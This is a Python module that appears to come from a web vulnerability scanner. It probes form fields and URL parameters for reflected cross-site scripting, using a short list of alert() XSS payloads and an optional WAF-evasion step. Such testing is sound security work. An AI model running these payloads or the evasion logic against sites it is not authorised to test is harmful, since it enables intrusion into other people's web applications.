import requests
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.smart_fuzzer import SmartFuzzer

PAYLOADS = [
    "<script>alert('XSS')</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>"
]

def run_xss_scan(target_url, endpoints, forms, waf_engine=None):
    print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Running Smart Contextual XSS Scan...")
    results = []
    
    # Initialize Smart Fuzzer
    fuzzer = SmartFuzzer(waf_engine=waf_engine)

    # 1. Scan query parameters in endpoints using Smart Fuzzer
    for url in endpoints:
        smart_findings = fuzzer.analyze_xss_context(url)
        if smart_findings:
            for finding in smart_findings:
                res = f"Smart Reflected XSS on {finding['url']} [Param: {finding['param']}] — Context: {finding['context']}"
                print(f"  [{Fore.RED}!{Style.RESET_ALL}] {res}")
                results.append({"type": "xss_smart", "desc": res, "severity": "Critical"})

    # 2. Scan forms (Fallback to standard testing with WAF evasion)
    for form in forms:
        action = form["action"]
        method = form["method"]
        
        for payload in PAYLOADS:
            if waf_engine:
                payload = waf_engine.evade(payload)
                
            data = {}
            for input_field in form["inputs"]:
                data[input_field["name"]] = payload
                
            try:
                if method == 'post':
                    r = waf_engine.request('POST', action, data=data, timeout=5) if waf_engine else requests.post(action, data=data, timeout=5)
                else:
                    r = waf_engine.request('GET', action, params=data, timeout=5) if waf_engine else requests.get(action, params=data, timeout=5)
                    
                if payload in r.text:
                    res = f"Reflected XSS in form {action} via {method.upper()} with payload {payload[:20]}..."
                    print(f"  [{Fore.RED}!{Style.RESET_ALL}] {res}")
                    results.append({"type": "xss", "desc": res, "severity": "High"})
            except requests.RequestException:
                continue

    return results
